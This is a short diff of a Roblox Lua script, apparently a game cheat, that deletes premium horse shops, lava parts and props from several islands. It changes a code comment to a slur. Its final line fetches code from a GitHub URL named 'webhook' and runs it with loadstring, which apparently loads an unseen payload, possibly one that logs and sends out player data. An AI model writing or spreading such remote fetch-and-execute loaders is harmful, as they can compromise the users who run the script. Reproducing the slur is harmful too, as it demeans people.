@@ -1,4 +1,4 @@
--- Services
+-- ServicesFag
 local players = game:GetService("Players")
 local lp = players.LocalPlayer
 local playerGui = lp:WaitForChild("PlayerGui")
@@ -297,6 +297,6 @@ followLoopFrom(workspace.Islands["Jungle Island"])
 workspace.Islands["Volcano Island"]:WaitForChild("LavaParts"):Destroy()
 workspace.Islands["Jungle Island"]:WaitForChild("Buildings"):WaitForChild("Horse Sale Barn"):WaitForChild("PremiumHorseShop"):Destroy()
 workspace.Islands["Lunar Islands"]:WaitForChild("Buildings"):WaitForChild("Horse Sale Barn"):WaitForChild("PremiumHorseShop"):Destroy()
-workspace.Islands["Volcano Island"]:WaitForChild("Buildings"):WaitForChild("Horse Sale Barn"):WaitForChild("PremiumHorseShop"):Destroy()
+workspace.Islands["Volcano Island"]:WaitForChild("Props"):Destroy()
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
